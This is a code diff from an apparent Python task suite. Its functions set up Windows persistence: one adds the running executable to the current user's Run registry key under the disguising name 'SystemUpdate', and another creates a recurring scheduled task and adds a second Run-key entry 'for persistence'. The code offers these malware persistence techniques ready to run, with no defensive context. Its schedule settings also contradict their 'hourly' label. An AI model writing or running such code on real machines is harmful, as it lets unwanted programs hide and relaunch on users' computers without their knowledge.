@@ -2,9 +2,9 @@
 import sys
 import json
 import time
+import subprocess
 import os
 import winreg
-import subprocess
 from typing import Dict, Any
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
@@ -12,25 +12,22 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     input_data = input_data or {}
     key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
     value_name = 'SystemUpdate'
-    value_data = sys.executable if sys.executable else os.path.abspath(sys.argv[0])
-    
+    value_data = sys.executable
+
     try:
+        # Open the registry key
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
+            # Set the value for the Run key
             winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
             # Verify by reading back
             registered_value, _ = winreg.QueryValueEx(key, value_name)
-            if registered_value == value_data:
-                result = {
-                    'key_path': key_path,
-                    'value_name': value_name,
-                    'value_data': value_data
-                }
-            else:
-                result = {
-                    'key_path': key_path,
-                    'value_name': value_name,
-                    'value_data': None
-                }
+            registered = (registered_value == value_data)
+
+        result = {
+            'key_path': key_path,
+            'value_name': value_name,
+            'value_data': value_data if registered else None
+        }
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
@@ -39,54 +36,46 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
             'value_name': value_name,
             'value_data': None
         }
-        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    task_name = "MyScheduledTask"
-    execution_time = 60  # in minutes
-    task_created = False
-    registered = False
-
+    task_name = "HourlyTask"
+    schedule = "hourly"
+    action = None
     try:
+        # Determine the executable path
+        exe_path = sys.executable if sys.executable else os.path.abspath(sys.argv[0])
+        
         # Create a scheduled task using schtasks
-        command = [
-            'schtasks', '/create', '/tn', task_name, '/tr', sys.executable,
-            '/sc', 'minute', '/mo', str(execution_time), '/f'
-        ]
-        result = subprocess.run(command, capture_output=True, text=True, timeout=30)
+        result = subprocess.run(
+            ['schtasks', '/create', '/tn', task_name, '/tr', exe_path, '/sc', schedule, '/mo', '60', '/f'],
+            capture_output=True, text=True, timeout=10
+        )
+        
         if result.returncode == 0:
-            task_created = True
-
-        # Register the task in the Windows Registry for persistence
-        key_name = "MyScheduledTask"
-        exe_path = sys.executable
-
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                            r'Software\Microsoft\Windows\CurrentVersion\Run',
-                            0, winreg.KEY_SET_VALUE) as key:
-            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
-            # Verify registration
-            registered_value, _ = winreg.QueryValueEx(key, key_name)
-            if registered_value == exe_path:
-                registered = True
-
-        # Prepare the result
-        result = {
-            "task_name": task_name if task_created else None,
-            "execution_time": execution_time if task_created else None
-        }
-        return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T2', 'execution_time': time.time() - start}}
+            action = exe_path
+        else:
+            print(f"Failed to create scheduled task: {result.stderr}")
+        
+        # Register in Windows Registry for persistence
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, exe_path)
+                registered_exe_path, _ = winreg.QueryValueEx(key, task_name)
+                if registered_exe_path != exe_path:
+                    print("Failed to verify registry entry.")
+        except Exception as reg_error:
+            print(f"Registry error: {reg_error}")
+        
+        return {'success': True, 'data': {'task_name': task_name, 'schedule': schedule, 'action': action},
+                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        result = {
-            "task_name": None,
-            "execution_time": None
-        }
-        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T2', 'execution_time': time.time() - start}}
+        return {'success': False, 'data': {'task_name': task_name, 'schedule': schedule, 'action': action},
+                'error': f'{type(e).__name__}: {e}',
+                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
